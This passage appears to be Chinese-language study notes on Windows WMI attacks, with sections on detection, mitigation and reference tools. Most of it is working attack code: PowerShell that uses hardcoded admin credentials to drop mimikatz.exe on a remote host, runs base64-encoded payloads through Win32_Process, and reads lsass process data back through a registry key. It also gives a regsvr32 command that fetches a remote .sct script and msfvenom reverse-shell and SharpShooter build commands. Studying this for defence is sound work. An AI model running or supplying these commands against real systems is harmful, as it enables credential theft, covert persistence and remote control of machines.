$Options.Password =’Admin!@#45’
$Options.EnablePrivileges =$True
$Connection=New-ObjectManagement.ManagementScope
$Connection.Path =’\\192.168.3.142\root\default’
$Connection.Options =$Options
$Connection.Connect()
WMI Attacks – C2 Communication (Registry) – “Pull” Attack
# “Push” file contents
$EvilClass=New-ObjectManagement.ManagementClass($Connection,
[String]::Empty,$null)
$EvilClass[‘__CLASS’]=’Win32_EvilClass’
$EvilClass.Properties.Add(‘EvilProperty’,[Management.CimType]
::String,$False)
$EvilClass.Properties[‘EvilProperty’].Value =$EncodedFileContentsToDrop
$EvilClass.Put()
#$Credential=Get-Credential’WIN-B85AAA7ST4U\Administrator’ 这是原版代码，下面是我修
改的代码
$Username ="0day\Administrator"  
$Password = ConvertTo-SecureString "Admin!@#45" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential 
$Username,$Password
$CommonArgs= @{
 Credential =$Credential
 ComputerName =’192.168.72.134’
}
# The PowerShell payload that will drop the stored file contents
$PayloadText=@’
$EncodedFile = ([WmiClass] ‘root\default:Win32_EvilClass’).
Properties[‘EvilProperty’].Value
[IO.File]::WriteAllBytes(‘C:\Users\Administrator\mimikatz.exe‘,
[Convert]::FromBase64String($EncodedFile))
‘@
$EncodedPayload=[Convert]::ToBase64String([Text.Encoding] ::Unicode.
GetBytes($PayloadText))
$PowerShellPayload=”powershell -NoProfile -EncodedCommand
$EncodedPayload”
# Drop the file to the target filesystem
Invoke-WmiMethod @CommonArgs -ClassWin32_Process-Name Create -ArgumentList 
$PowerShellPayload
# Confirm successful file drop
Get-WmiObject @CommonArgs -Class CIM_DataFile -Filter’Name = 
‘C:\Users\Administrator\mimikatz.exe‘
#远程创建类存储数据，远程使用Powershell读取类中的数据写入到文件系统中
$Username ="0day\Administrator"  
$Password = ConvertTo-SecureString "Admin!@#45" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential 
$Username,$Password
$CommonArgs = @{Credential = 
    $Credential
    ComputerName = '192.168.3.142'
}
$HKLM = 2147483650
#HKEY_LOCAL_MACHINE = 2147483650（0x80000002）
Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name CreateKey -ArgumentList 
$HKLM,'SOFTWARE\EvilKey'
WMI Attacks – Stealthy Command “Push”
上面例子中基本调用的是 powershell 或cmd，在笔者其他篇中提到过ELK配合sysmon ，查找这类攻击
很容易，在Command-line 中查找即可，还记得前面的脚本 EventConsumer 使用的都是
CommandLineEventConsumer ，但是没有使用 ActiveScriptEventConsumer ,如果使用该类执行
VBScript，则只会启动WMI脚本宿主进程：
和原演讲PPT有区别，这部分是我在阅读其他师傅的博客得到的表述，其实和利用WMI 永久事件
订阅相同，只不过其中 `CommandLine 变为执行脚本。
如何构造VBScript？相关框架可以自动生成，比如MSF。
整个过程看起来是这样：
Event filter example: __IntervalTimerInstruction（可选择其他事件过滤器）
Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name DeleteValue -ArgumentList 
$HKLM,'SOFTWARE\EvilKey','Result' 
#在远程主机上新建注册表项和值Result
$PayloadText = @'
$Payload = {Get-Process lsass}
$Result = & $Payload
$Output = [Management.Automation.PSSerializer]::Serialize($Result, 5)
#查阅MSDN，发现这是一种序列化对象的方法
$Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Output))
Set-ItemProperty -Path HKLM:\SOFTWARE\EvilKey -Name Result -Value $Encoded
'@
$EncodedPayload = 
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
#序列化后对象之后编码为Base64
$PowerShellPayload = "powershell -NoProfile -EncodedCommand $EncodedPayload"
Invoke-WmiMethod @CommonArgs -Class Win32_Process -Name Create -ArgumentList 
$PowerShellPayload
$RemoteOutput = Invoke-WmiMethod @CommonArgs -Class StdRegProv -Name 
GetStringValue -ArgumentList $HKLM,'SOFTWARE\EvilKey','Result'
$EncodedOutput = $RemoteOutput.sValue
$DeserializedOutput =
[Management.Automation.PSSerializer]::Deserialize([Text.Encoding]::Ascii.GetStri
ng([Convert]::FromBase64String($EncodedOutput)))
#将$EncodedOutput 解码，进行反序列化，笔者测试失败，遇到错误，有成功运行的师傅麻烦指教下。
%SystemRoot%\system32\wbem\scrcons.exe -Embedding
Event consumer – ActiveScriptEventConsumer
Event FilterToConsumerBinding
等待Payload 执行，删除永久的WMI 事件订阅（也就是3个组件的类的实例），payload是由WMI脚本
宿主进程启动。
没有代码
WMI Providers
参考：WMI Providers 
如果你注意到MSDN 文档，WMI Providers 有着详细的开发文档（最常见的是笔记本厂商往往会扩展
WMI Providers)，如果构造出恶意的 WMI Providers 就能执行payload或者获取用户的数据。
笔者这反面了解甚少，这里演讲者推荐了几个项目
EvilWMIProvider（已404）
EvilNetConnectionWMIProvider（最后一次更新是5年前)
枚举 WMI Providers：
Get-WmiProvider.ps1 
PoC WMI Backdoor
掠过，WMI Backdoor 未放出源代码，因此给出的函数实际意义不大。
Attack Defense and Mitigations
参考：Tales of a Threat Hunter 2
检测
Powershell或其他工具查询对应的类：Filter、consumer 、FilterToConsumerBinding 
Autoruns（GUI 界面的WMI菜单栏）
相关文章：透过Autoruns看持久化绕过姿势的分享（一）
防御
所有的系统行为都可以引发一个事件，包括前面的创建/删除WMI 永久事件订阅、修改注册表、安装
WMI Providers 都会触发对应的事件。
具体的事件请使用 Get-WmiObject -Class *__*event* -list  查看。
笔者的思路为：注册对应的WMI 永久事件订阅，来监控对应的事件，动作设置为写入日志或其他（列
如通知）
注：删除WMI 永久事件订阅本身也可以触发事件
缓解措施
禁用WMI服务：可以会影响依赖该服务的应用
防火墙限制端口
日志
由于WMI 服务涉及 WinRM和DCOM，所以需要查看3种服务的日志，比较推荐使用sysmon
捕获日志
Microsoft-Windows-WinRM/Operational
Microsoft-Windows-WMI-Activity/Operational
Microsoft-Windows-DistributedCom
相关项目：WMI_Monitor
各类工具
参考：Persistence – WMI Event Subscription
WMImplant
WMIOps
Metasploit 中的 puts generate_mof
这种方式父进程是 %SystemRoot%\system32\wbem\scrcons.exe -Embedding
msfvenom + SharpShooter +WMIPersistence+csc
use exploit/windows/smb/psexec
irb
puts generate_mof("Metasploit1","notepad.exe")
#生成恶意mof文件
#命令部分自定义，例如 regsvr32 /s /n /u /i:http://example.com/file.sct 
scrobj.dll
#在目标Windows 机器上使用自带的 mofcomp.exe .\Metasploit.mof 编译
#如果你愿意阅读下生成的mof文件的代码，核心部分是通过Jscript调用wmi，扩展
Win32Provider，构造WMI 永久事件订阅
#考虑进程迁移
PoshC2 中Invoke-wmievent
Metasploit 中的 exploit/windows/local/wmi_persistence ，默认 Filter 是出现4625事件，
4625事件是登录失败( runas 输入错误账户密码即可导致该事件 )
Empire 中 persistence/elevated/wmi ,同样是 4625 事件触发，
persistence/elevated/wmi_updater 可以从远程获取 payload，注册的 WMI 永久事件订阅 默
认 Name 为 AutoUpdater
更多的资料
Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and 
Fileless Backdoor
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.128 
LPORT=4444 -f raw -o payload.bin
python SharpShooter.py --stageless --dotnetver 2 --payload vbs --output 
implantvbs --rawscfile payload.bin
#@冷逸指出有可能是Outlook.CreateObject() COM  导致的失败
base64 -i output/implantvbs.vbs > ./payload.txt
cd C:\Windows\Microsoft.NET\Framework64\v3.5 #
csc.exe WMIPersist.cs /r:System.Management.Automation.dll  #windows 中编译
#目标执行，笔者测试为复现成功
THERE’S SOMETHING ABOUT WMI
Windows管理规范（WMI）指南：了解WMI攻击
Command and Control – WMI
WMI 101 for Pentesters
Handling Events with PowerShell and WMI
Blue Team Hacks - WMI Eventing
WMI vs. WMI: Monitoring for Malicious Activity
比较好的中文资料
Windows WMI技术总结
wmic命令解析与实例
完美的介绍了wmic命令的各种应用，用户管理、组管理、加域、配置ip、注册表编辑等等
以及三好学生的几篇博文
WMI Attacks
WMI Backdoor
WMI Defense
Study Notes of WMI Persistence using wmic.exe
WSC、JSRAT and WMI Backdoor
FireEye 报告的译文
WMI的攻击，防御与取证分析技术之攻击篇
WMI 的攻击，防御与取证分析技术之防御篇